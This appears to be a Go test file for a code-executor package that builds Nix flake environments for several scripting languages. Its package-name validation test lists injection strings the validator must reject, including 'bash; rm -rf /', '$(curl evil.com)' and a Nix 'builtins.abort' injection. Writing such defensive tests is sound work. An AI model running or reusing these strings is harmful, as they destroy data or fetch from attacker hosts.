package executor

import (
	"testing"
)

func TestResolveInterpreter(t *testing.T) {
	tests := []struct {
		lang string
		want string
		err  bool
	}{
		{"python", "python3", false},
		{"bash", "bash", false},
		{"node", "node", false},
		{"haskell", "runhaskell", false},
		{"lua", "lua", false},
		{"ruby", "ruby", false},
		{"perl", "perl", false},
		{"octave", "octave", false},
		{"rust", "", true},
	}

	for _, tt := range tests {
		got, err := resolveInterpreter(tt.lang)
		if tt.err && err == nil {
			t.Errorf("resolveInterpreter(%q) expected error, got nil", tt.lang)
		}
		if !tt.err && got != tt.want {
			t.Errorf("resolveInterpreter(%q) = %q, want %q", tt.lang, got, tt.want)
		}
	}
}

func TestWithInterpreterPackage(t *testing.T) {
	tests := []struct {
		lang string
		pkgs []string
		want []string
	}{
		{"python", nil, []string{"python3"}},
		{"python", []string{"python3"}, []string{"python3"}},
		{"bash", []string{"curl"}, []string{"bash", "curl"}},
		{"node", []string{"ripgrep"}, []string{"nodejs", "ripgrep"}},
		{"haskell", nil, []string{"haskellPackages.ghc"}},
		{"lua", nil, []string{"lua5_4"}},
		{"ruby", nil, []string{"ruby"}},
		{"perl", nil, []string{"perl5"}},
		{"octave", nil, []string{"octave"}},
	}

	for _, tt := range tests {
		got := withInterpreterPackage(tt.lang, tt.pkgs)
		if len(got) != len(tt.want) {
			t.Errorf("withInterpreterPackage(%q, %v) = %v, want %v", tt.lang, tt.pkgs, got, tt.want)
			continue
		}
		for i := range got {
			if got[i] != tt.want[i] {
				t.Errorf(
					"withInterpreterPackage(%q, %v) = %v, want %v",
					tt.lang,
					tt.pkgs,
					got,
					tt.want,
				)
				break
			}
		}
	}
}

func TestScriptExtension(t *testing.T) {
	tests := []struct {
		lang string
		want string
	}{
		{"python", ".py"},
		{"bash", ".sh"},
		{"node", ".js"},
		{"haskell", ".hs"},
		{"lua", ".lua"},
		{"ruby", ".rb"},
		{"perl", ".pl"},
		{"octave", ".m"},
		{"unknown", ""},
	}

	for _, tt := range tests {
		got := scriptExtension(tt.lang)
		if got != tt.want {
			t.Errorf("scriptExtension(%q) = %q, want %q", tt.lang, got, tt.want)
		}
	}
}

func TestCacheKey(t *testing.T) {
	url := "github:NixOS/nixpkgs/nixpkgs-unstable"

	key1 := cacheKey("python", []string{"bash", "python3"}, url)
	key2 := cacheKey("python", []string{"bash", "python3"}, url)
	key3 := cacheKey("python", []string{"bash"}, url)
	key4 := cacheKey("bash", []string{"bash", "python3"}, url)
	key5 := cacheKey("python", []string{"bash", "python3"}, "github:user/other")

	if key1 != key2 {
		t.Error("cacheKey should be deterministic for same input")
	}

	if key1 == key3 {
		t.Error("cacheKey should differ for different package sets")
	}

	if key1 == key4 {
		t.Error("cacheKey should differ for different languages")
	}

	if key1 == key5 {
		t.Error("cacheKey should differ for different nixpkgs URLs")
	}

	if len(key1) != 64 {
		t.Errorf("cacheKey should be 64 hex chars (sha256), got %d", len(key1))
	}
}

func TestValidPackageName(t *testing.T) {
	tests := []struct {
		pkg  string
		want bool
	}{
		{"bash", true},
		{"python3Packages.pandas", true},
		{"haskellPackages.ghc", true},
		{"lua5_4Packages.dkjson", true},
		{"rubyPackages.pry", true},
		{"my-package", true},
		{"pkg_v2", true},
		{"a1", true},
		{"", false},
		{".bash", false},
		{"-bash", false},
		{"bash]; builtins.abort \"pwned\"; pkgs.bash", false},
		{"bash\noops", false},
		{"bash$(evil)", false},
		{"bash; rm -rf /", false},
		{"bash`evil`", false},
		{"$(curl evil.com)", false},
	}

	for _, tt := range tests {
		got := validPackageName(tt.pkg)
		if got != tt.want {
			t.Errorf("validPackageName(%q) = %v, want %v", tt.pkg, got, tt.want)
		}
	}
}

func TestPkgDenied(t *testing.T) {
	tests := []struct {
		pkg    string
		denied string
		want   bool
	}{
		{"bash", "bash", true},
		{"bash", "python", false},
		{"python3Packages.pandas", "python3Packages", true},
		{"python3Packages.pandas", "pandas", true},
		{"haskellPackages.lens", "lens", true},
		{"haskellPackages.lens", "haskellPackages", true},
		{"rubyPackages.pry", "pry", true},
		{"ripgrep", "ripgrep", true},
		{"ripgrep", "rip", false},
		{"lua5_4Packages.dkjson", "dkjson", true},
		{"lua5_4Packages.dkjson", "lua5_4Packages", true},
		{"my-pkg", "my", false},
	}

	for _, tt := range tests {
		got := pkgDenied(tt.pkg, tt.denied)
		if got != tt.want {
			t.Errorf("pkgDenied(%q, %q) = %v, want %v", tt.pkg, tt.denied, got, tt.want)
		}
	}
}

func TestGenerateFlake(t *testing.T) {
	t.Run("default", func(t *testing.T) {
		flake := generateFlake(
			"bash",
			[]string{"bash", "ripgrep"},
			"github:NixOS/nixpkgs/nixpkgs-unstable",
		)
		if flake == "" {
			t.Fatal("generateFlake returned empty string")
		}
		wantPkgs := []string{"pkgs.bash", "pkgs.ripgrep"}
		for _, pkg := range wantPkgs {
			if !contains(flake, pkg) {
				t.Errorf("generated flake missing %q", pkg)
			}
		}
		if !contains(flake, "buildEnv") {
			t.Error("generated flake missing buildEnv")
		}
	})

	t.Run("python_with_packages", func(t *testing.T) {
		flake := generateFlake(
			"python",
			[]string{"python3", "python3Packages.pandas"},
			"github:NixOS/nixpkgs/nixpkgs-unstable",
		)
		if !contains(flake, "withPackages") {
			t.Error("python flake should use withPackages")
		}
		if !contains(flake, "ps.pandas") {
			t.Error("python flake should reference ps.pandas")
		}
		if contains(flake, "pkgs.python3Packages.pandas") {
			t.Error("python flake should not reference python3Packages directly in paths")
		}
	})

	t.Run("python_no_packages", func(t *testing.T) {
		flake := generateFlake(
			"python",
			[]string{"python3"},
			"github:NixOS/nixpkgs/nixpkgs-unstable",
		)
		if !contains(flake, "pkgs.python3\n") {
			t.Error("python flake without packages should use pkgs.python3 directly")
		}
		if contains(flake, "withPackages") {
			t.Error("python flake without packages should not use withPackages")
		}
	})

	t.Run("haskell_with_packages", func(t *testing.T) {
		flake := generateFlake(
			"haskell",
			[]string{"haskellPackages.ghc", "haskellPackages.lens", "haskellPackages.mtl"},
			"github:NixOS/nixpkgs/nixpkgs-unstable",
		)
		if !contains(flake, "withPackages") {
			t.Error("haskell flake should use withPackages")
		}
		if !contains(flake, "pkgs.haskellPackages.ghc.withPackages") {
			t.Error("haskell flake should use pkgs.haskellPackages.ghc.withPackages")
		}
		if !contains(flake, "ps.lens") {
			t.Error("haskell flake should reference ps.lens")
		}
		if !contains(flake, "ps.mtl") {
			t.Error("haskell flake should reference ps.mtl")
		}
		if contains(flake, "pkgs.haskellPackages.lens") {
			t.Error("haskell flake should not reference haskellPackages directly in paths")
		}
	})

	t.Run("haskell_no_packages", func(t *testing.T) {
		flake := generateFlake(
			"haskell",
			[]string{"haskellPackages.ghc"},
			"github:NixOS/nixpkgs/nixpkgs-unstable",
		)
		if !contains(flake, "pkgs.haskellPackages.ghc\n") {
			t.Error("haskell flake without packages should use pkgs.haskellPackages.ghc directly")
		}
		if contains(flake, "withPackages") {
			t.Error("haskell flake without packages should not use withPackages")
		}
	})

	t.Run("lua_with_packages", func(t *testing.T) {
		flake := generateFlake(
			"lua",
			[]string{"lua5_4", "lua5_4Packages.busted", "lua5_4Packages.luafilesystem"},
			"github:NixOS/nixpkgs/nixpkgs-unstable",
		)
		if !contains(flake, "withPackages") {
			t.Error("lua flake should use withPackages")
		}
		if !contains(flake, "pkgs.lua5_4.withPackages") {
			t.Error("lua flake should use pkgs.lua5_4.withPackages")
		}
		if !contains(flake, "ps.busted") {
			t.Error("lua flake should reference ps.busted")
		}
	})

	t.Run("ruby_with_packages", func(t *testing.T) {
		flake := generateFlake(
			"ruby",
			[]string{"ruby", "rubyPackages.pry"},
			"github:NixOS/nixpkgs/nixpkgs-unstable",
		)
		if !contains(flake, "withPackages") {
			t.Error("ruby flake should use withPackages")
		}
		if !contains(flake, "pkgs.ruby.withPackages") {
			t.Error("ruby flake should use pkgs.ruby.withPackages")
		}
		if !contains(flake, "ps.pry") {
			t.Error("ruby flake should reference ps.pry")
		}
	})

	t.Run("perl_with_packages", func(t *testing.T) {
		flake := generateFlake(
			"perl",
			[]string{"perl5", "perlPackages.Moose"},
			"github:NixOS/nixpkgs/nixpkgs-unstable",
		)
		if !contains(flake, "withPackages") {
			t.Error("perl flake should use withPackages")
		}
		if !contains(flake, "pkgs.perl5.withPackages") {
			t.Error("perl flake should use pkgs.perl5.withPackages")
		}
		if !contains(flake, "ps.Moose") {
			t.Error("perl flake should reference ps.Moose")
		}
	})

	t.Run("octave_with_packages", func(t *testing.T) {
		flake := generateFlake(
			"octave",
			[]string{"octave", "octavePackages.signal"},
			"github:NixOS/nixpkgs/nixpkgs-unstable",
		)
		if !contains(flake, "withPackages") {
			t.Error("octave flake should use withPackages")
		}
		if !contains(flake, "pkgs.octave.withPackages") {
			t.Error("octave flake should use pkgs.octave.withPackages")
		}
		if !contains(flake, "ps.signal") {
			t.Error("octave flake should reference ps.signal")
		}
	})

	t.Run("mixed_with_other_packages", func(t *testing.T) {
		flake := generateFlake(
			"python",
			[]string{"python3", "python3Packages.numpy", "ripgrep"},
			"github:NixOS/nixpkgs/nixpkgs-unstable",
		)
		if !contains(flake, "withPackages") {
			t.Error("should use withPackages for python packages")
		}
		if !contains(flake, "ps.numpy") {
			t.Error("should reference ps.numpy")
		}
		if !contains(flake, "pkgs.ripgrep") {
			t.Error("should include non-language packages as pkgs.ripgrep")
		}
	})

	t.Run("unknown_language", func(t *testing.T) {
		flake := generateFlake(
			"unknown",
			[]string{"bash"},
			"github:NixOS/nixpkgs/nixpkgs-unstable",
		)
		if !contains(flake, "pkgs.bash") {
			t.Error("unknown language should fall back to plain pkgs references")
		}
	})
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && (s == sub || len(s) > 0 && containsStr(s, sub))
}

func containsStr(s, sub string) bool {
	for i := 0; i <= len(s)-len(sub); i++ {
		if s[i:i+len(sub)] == sub {
			return true
		}
	}
	return false
}
